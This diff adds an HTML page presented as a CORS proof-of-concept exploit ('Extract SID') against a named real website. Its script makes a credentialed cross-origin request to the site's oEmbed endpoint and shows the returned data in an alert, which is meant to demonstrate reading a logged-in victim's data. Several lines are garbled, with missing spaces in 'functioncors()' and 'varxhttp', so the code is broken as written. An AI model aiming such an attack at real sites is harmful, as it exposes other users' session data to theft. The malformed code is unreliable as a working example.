@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+	<meta charset="utf-8">
+	<title>CORS POC</title>
+<body>
+	<center>
+		<h2>CORS POC Exploit</h2>
+		<h3>Extract SID</h3>
+		<div id="demo">
+			<button type="button" onclick="cors()">Exploit</button>
+		</div>
+	</center>
+	<script>
+		functioncors() {
+		varxhttp = new XMLHttpRequest();
+		xhttp.onreadystatechange = function() {
+		if (this.readyState == 4 &&this.status == 200) {
+		document.getElementById("demo").innerHTML = alert(this.responseText);
+		}
+		};
+		xhttp.open("GET","https://pathao.com/bn/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpathao.com%2Fbn%2F", true);
+		xhttp.withCredentials = true;
+		xhttp.send();
+		}
+	</script>
+</body>
+</html>
